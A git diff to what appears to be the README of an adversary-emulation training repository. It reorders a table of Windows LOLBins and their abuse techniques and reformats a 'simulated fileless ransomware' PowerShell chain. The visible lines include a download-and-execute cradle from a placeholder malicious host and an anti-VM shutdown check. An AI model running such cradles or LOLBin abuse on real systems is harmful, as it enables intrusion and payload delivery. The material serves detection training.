@@ -61,10 +61,31 @@ This repository is for:
 
 ## 🔗 MITRE ATT&CK-Aligned PowerShell Simulation
 
+
+---
+
+## 🧩 LOLBins (Living Off the Land Binaries)
+
+| Binary            | Function                            | Techniques                                          |
+|------------------|-------------------------------------|-----------------------------------------------------|
+| `rundll32.exe`   | Reflective DLL execution             | [T1218.011](https://attack.mitre.org/techniques/T1218/011/), [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
+| `mshta.exe`      | HTA script execution                 | [T1218.005](https://attack.mitre.org/techniques/T1218/005/) |
+| `regsvr32.exe`   | COM script loading                   | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) |
+| `wmic.exe`       | Remote execution, WMI abuse          | [T1047](https://attack.mitre.org/techniques/T1047/), [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
+| `certutil.exe`   | Download/decode payloads             | [T1105](https://attack.mitre.org/techniques/T1105/), [T1140](https://attack.mitre.org/techniques/T1140/) |
+| `msbuild.exe`    | Compile/execute C# payloads          | [T1127.001](https://attack.mitre.org/techniques/T1127/001/), [T1059.005](https://attack.mitre.org/techniques/T1059/005/) |
+| `bitsadmin.exe`  | Background file transfer             | [T1105](https://attack.mitre.org/techniques/T1105/) |
+| `schtasks.exe`   | Persistence via task scheduling      | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |
+
+---
+## 🔗 MITRE ATT&CK-Aligned PowerShell Simulation
+
 > ⚠️ This is a **non-operational** emulation for training and detection tuning.
 
-    <details>
-    <summary>💥 Simulated Fileless Ransomware Chain</summary>
+<details>
+<summary>💥 Simulated Fileless Ransomware Chain (Click to Expand)</summary>
+
+    ```powershell
     # 🎯 [T1190] – Initial Access (Phishing or Remote Exploit)
     $u = "http://malicious.com/a.ps1"
     try { IEX (New-Object Net.WebClient).DownloadString($u) } catch {}
@@ -143,26 +164,6 @@ This repository is for:
     $vmCheck = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
     if ($vmCheck -match "VirtualBox|VMware|Xen|QEMU") { Stop-Computer -Force }
     
-    
-    
-    </details>
-
----
-
-## 🧩 LOLBins (Living Off the Land Binaries)
-
-| Binary            | Function                            | Techniques                                          |
-|------------------|-------------------------------------|-----------------------------------------------------|
-| `rundll32.exe`   | Reflective DLL execution             | [T1218.011](https://attack.mitre.org/techniques/T1218/011/), [T1055.001](https://attack.mitre.org/techniques/T1055/001/) |
-| `mshta.exe`      | HTA script execution                 | [T1218.005](https://attack.mitre.org/techniques/T1218/005/) |
-| `regsvr32.exe`   | COM script loading                   | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) |
-| `wmic.exe`       | Remote execution, WMI abuse          | [T1047](https://attack.mitre.org/techniques/T1047/), [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
-| `certutil.exe`   | Download/decode payloads             | [T1105](https://attack.mitre.org/techniques/T1105/), [T1140](https://attack.mitre.org/techniques/T1140/) |
-| `msbuild.exe`    | Compile/execute C# payloads          | [T1127.001](https://attack.mitre.org/techniques/T1127/001/), [T1059.005](https://attack.mitre.org/techniques/T1059/005/) |
-| `bitsadmin.exe`  | Background file transfer             | [T1105](https://attack.mitre.org/techniques/T1105/) |
-| `schtasks.exe`   | Persistence via task scheduling      | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) |
-
----
 
 ## 📚 Resources
 
